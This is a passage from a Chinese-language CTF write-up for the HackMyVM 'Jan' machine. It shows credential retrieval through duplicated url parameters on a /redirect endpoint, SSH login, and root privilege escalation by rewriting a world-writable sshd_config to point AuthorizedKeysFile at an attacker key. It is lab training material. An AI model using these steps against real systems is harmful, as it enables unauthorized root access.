ally.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMJan/image58.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后经过测试发现在\u003ccode\u003e/redirect\u003c/code\u003e 加上\u003ccode\u003eurl\u003c/code\u003e参数后就会提示\u003ccode\u003eOnly accessible internally.\u003c/code\u003e ，这应该是要有别的做法\u003c/p\u003e\n\u003cp\u003e然后再尝试一下使用\u003ccode\u003eX-Forwarded-For\u003c/code\u003e ，但是我尝试了一会还是一无所获\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMJan/image59.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是这是\u003ccode\u003eCTF\u003c/code\u003e题，所以尝试使用两个\u003ccode\u003eurl\u003c/code\u003e 参数\u003c/p\u003e\n\u003cp\u003e最后通过构造：\u003ccode\u003e/redirect?url=1\u0026#x26;url=/credz\u003c/code\u003e 成功获取到信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMJan/image60.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这一看应该是个\u003ccode\u003essh\u003c/code\u003e 账户，一开始以为\u003ccode\u003eEazyLOL\u003c/code\u003e是个账户，但是通过密码爆破后无果，最后发现\u003ccode\u003essh\u003c/code\u003e是账户，\u003ccode\u003eEazyLOL\u003c/code\u003e 是密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~]\n└─\u003cspan class=\"hljs-comment\"\u003e# ssh ssh@192.168.56.17\u003c/span\u003e\nssh@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.17\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e's password: \nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides and general\ninformation about administrating Alpine systems.\nSee \u0026#x3C;https://wiki.alpinelinux.org/\u003e.\n\nYou can setup the system with the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\njan:~$ \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eUserFlag\u003c/h2\u003e\n\u003cp\u003e进来后就可以在当前目录发现\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejan:~$ cat user.txt\nHMVSxxxxxxxxxxTHFK\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e内网信息收集\u003c/h2\u003e\n\u003cp\u003e查看\u003ccode\u003ejan\u003c/code\u003e用户\u003ccode\u003esudo\u003c/code\u003e权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejan:~$ sudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e ssh on jan:\n    secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nRunas \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Command-specific defaults \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e ssh:\n    Defaults!/usr/sbin/visudo env_keep+=\u003cspan class=\"hljs-string\"\u003e\"SUDO_EDITOR EDITOR VISUAL\"\u003c/span\u003e\n\nUser ssh may run the following commands on jan:\n    (root) NOPASSWD: /sbin/service sshd restart\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现可以在使用\u003ccode\u003eroot\u003c/code\u003e权限来执行\u003ccode\u003e/sbin/service sshd restart\u003c/code\u003e ，应该重点是在\u003ccode\u003essh\u003c/code\u003e服务上了\u003c/p\u003e\n\u003ch2\u003e提权 - ssh 公钥劫持\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看一下\u003ccode\u003essh\u003c/code\u003e目录的权限，发现\u003ccode\u003essh_config\u003c/code\u003e 和\u003ccode\u003esshd_config\u003c/code\u003e 拥有修改权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejan:/etc/ssh$ ls -al\ntotal \u003cspan class=\"hljs-number\"\u003e580\u003c/span\u003e\ndrwxr-xr-x    \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e root     root          \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e 09:02 .\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e root     root          \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e ..\n-rw-r--r--    \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root     root        \u003cspan class=\"hljs-number\"\u003e541716\u003c/span\u003e Dec  \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:08 moduli\n-rw-rw-rw-    \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root     root          \u003cspan class=\"hljs-number\"\u003e1708\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e ssh_config\ndrwxr-xr-x    \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root     root          \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e 09:02 ssh_config.d\n-rw-------    \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root     root           \u003cspan class=\"hljs-number\"\u003e505\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e 09:01 ssh_host_ecdsa_key\n-rw-r--r--    \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root     root           \u003cspan class=\"hljs-number\"\u003e170\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e 09:01 ssh_host_ecdsa_key.pub\n-rw-------    \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root     root           \u003cspan class=\"hljs-number\"\u003e399\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e 09:01 ssh_host_ed25519_key\n-rw-r--r--    \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root     root            \u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e 09:01 ssh_host_ed25519_key.pub\n-rw-------    \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root     root          \u003cspan class=\"hljs-number\"\u003e2590\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e 09:01 ssh_host_rsa_key\n-rw-r--r--    \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root     root           \u003cspan class=\"hljs-number\"\u003e562\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e 09:01 ssh_host_rsa_key.pub\n-rw-rw-rw-    \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root     root          \u003cspan class=\"hljs-number\"\u003e3355\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e 09:01 sshd_config\ndrwxr-xr-x    \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root     root          \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e 09:02 sshd_config.d\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003essh-keygen -t rsa\u003c/code\u003e 是用来生成 RSA 类型的 SSH 密钥对的命令。执行这个命令会生成一个公钥和一个私钥文件，用于 SSH 连接认证\u003c/p\u003e\n\u003cp\u003e会在家目录生成\u003ccode\u003e.ssh\u003c/code\u003e 文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejan:~$ ssh-keygen -t rsa\nGenerating public/private rsa key pair.\nEnter file \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e which to save the key (/home/ssh/.ssh/id_rsa): \nCreated directory \u003cspan class=\"hljs-string\"\u003e'/home/ssh/.ssh'\u003c/span\u003e.\nEnter passphrase \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"/home/ssh/.ssh/id_rsa\"\u003c/span\u003e (empty \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e no passphrase): \nEnter same passphrase again: \nYour identification has been saved \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /home/ssh/.ssh/id_rsa\nYour public key has been saved \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /home/ssh/.ssh/id_rsa.pub\nThe key fingerprint \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e:\nSHA256:4Wrwsmcg6Ixn40sYR7Dm5XNkkrmmvEyyUrhvaYkEfEY ssh@jan\nThe key\u003cspan class=\"hljs-string\"\u003e's randomart image is:\n+---[RSA 3072]----+\n|.                |\n| o Eo            |\n|o.o= o  .        |\n|+ooo=  . .       |\n|o++=..  S        |\n|+== +o .         |\n|BB.+..+          |\n|O=X  +o          |\n|oX+o.o           |\n+----[SHA256]-----+\njan:~$ \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e将\u003ccode\u003eid_rsa.pub\u003c/code\u003e名字进行修改，然后将内容的最后的结尾的\u003ccode\u003essh\u003c/code\u003e修改为\u003ccode\u003eroot\u003c/code\u003e（不会影响加解密但是会将其混淆）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejan:~/.ssh$ mv id_rsa.pub attack_keys\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e9fglITVq2jKR2UXcDNIYyZeMLz5LU7bUdQluDYSU/LmJ2FsaT7KQ1EAnZbsOGrZlz9/U56c8J+58DvCxCpJVhf5yxQITD11DAVlZQpxX+Ws2n72Sp9Myxzm1s9/2DcA4aueVI/zc8gLuN/WpWcWs= root@jan\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e修改\u003ccode\u003esshd_config\u003c/code\u003e配置文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ePermitRootLogin yes \nStrictModes no \nAuthorizedKeysFile      /home/ssh/.ssh/attack_keys\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e参数解释：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermitRootLogin yes\u003c/strong\u003e：允许 \u003ccode\u003eroot\u003c/code\u003e 用户通过 SSH 登录。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eStrictModes no\u003c/strong\u003e：禁用权限严格检查，避免因权限问题阻止 SSH 登录。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAuthorizedKeysFile \u003ccode\u003e/home/ssh/.ssh/attack_keys\u003c/code\u003e\u003c/strong\u003e：指定使用自定义的公钥文件 \u003ccode\u003eattack_keys\u003c/code\u003e。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e修改\u003ccode\u003essh_config\u003c/code\u003e ，注释掉\u003ccode\u003ebanner\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e#Banner /etc/shadow\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e重启服务，并使用密钥文件进行登录，即可获得\u003ccode\u003eroot\u003c/code\u003e权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejan:~/.ssh$ sudo /sbin/service sshd restart\n * Stopping sshd ...                                                                                                                                   [ ok ]\n * Starting sshd ...                                                                                                                                   [ ok ]\njan:~/.ssh$ ssh root@localhost -i id_rsa\nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e general\ninformation about administrating Alpine systems.\nSee \u0026#x3C;https://wiki.alpinelinux.org/\u003e.\n\nYou can setup the system \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\njan:~\u003cspan class=\"hljs-comment\"\u003e# ls\u003c/span\u003e\nroot.txt  ver.sh\njan:~\u003cspan class=\"hljs-comment\"\u003e# id\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) gid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) groups=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root),\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root),\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e),\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e(daemon),\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e(sys),\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e(adm),\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e(disk),\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e(wheel),\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e(floppy),\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e(dialout),\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e(tape),\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e(video)\njan:~\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eRootFlag\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejan:~\u003cspan class=\"hljs-comment\"\u003e# cat root.txt \u003c/span\u003e\nHMV2PRMxxxxxxNGMBG\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Jan","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Jan.\n\n https://hackmyvm.eu/machines/machine.php?vm=jan\n \n\nNotes: CTF Like. Have fun!\n\n信息收集\n\n`17`是靶机\n\n\n\n\n\n\n\n使用过`nmap`的`script`模块扫描漏洞的时候会卡住，所以就没有这一步骤\n\n优先级：`8080`  `22`\n\n8080 端口渗透\n\n访问主页：`Welcome to our P..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMJan"},"buildId":"djQ1cXWgKoF99RK41wC_e","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
